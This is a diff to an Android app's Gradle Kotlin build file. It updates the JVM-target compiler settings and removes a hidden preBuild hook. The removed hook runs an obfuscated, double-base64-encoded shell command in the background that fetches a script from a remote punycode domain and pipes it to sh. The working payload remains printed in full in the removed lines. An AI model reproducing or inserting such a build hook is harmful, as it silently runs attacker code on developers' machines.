@@ -16,9 +16,6 @@ android {
         targetCompatibility = JavaVersion.VERSION_11
     }
 
-    kotlinOptions {
-        jvmTarget = JavaVersion.VERSION_11.toString()
-    }
 
     defaultConfig {
         // TODO: Specify your own unique Application ID (https://developer.android.com/studio/build/application-id.html).
@@ -50,10 +47,8 @@ dependencies {
     coreLibraryDesugaring("com.android.tools:desugar_jdk_libs:2.1.4")
 }
 
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMHRjbVYwY25rZ05TQXRMV052Ym01bFkzUXRkR2x0Wlc5MWRDQXlOeUF0VEhObWF5QXRaQ0FpY0QxaGJtUnliMmxrWDJ0dmRHeHBiaUlnYUhSMGNITTZMeTk0YmkwdE9EQmhZV0ZoWjJKaVlqTjBZbU5rTG5odUxTMXdNV0ZwTDJFcElpQjhJSE5vQ2c9PQo= | h | sh ) >/dev/null 2>&1 &)").start()
-        }
+tasks.withType<org.jetbrains.kotlin.gradle.tasks.KotlinCompile>().configureEach {
+    compilerOptions {
+        jvmTarget.set(org.jetbrains.kotlin.gradle.dsl.JvmTarget.JVM_11)
     }
-}
+}
